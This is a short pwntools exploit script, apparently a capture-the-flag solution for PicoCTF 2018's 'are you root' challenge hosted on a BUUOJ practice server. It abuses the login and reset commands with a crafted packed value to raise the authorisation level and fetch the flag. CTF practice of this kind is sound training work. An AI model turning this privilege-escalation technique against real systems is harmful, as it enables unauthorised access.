#!/usr/bin/env python
# coding=utf-8
from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'

local = 0
if local == 1:
    r=process('./PicoCTF_2018_are_you_root')
    
    gdb.attach(r,'b * 0x400AFF')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    r=remote('node4.buuoj.cn',25641)
    libc = ELF('./libc.so.6')

elf = ELF('./PicoCTF_2018_are_you_root')

def m(strs):
    r.recvuntil("> ")
    r.sendline(strs)

m('login '+'a'*0x8+p64(5))
m('reset')
m('login '+'b'*10)
m('get-flag')

r.interactive()
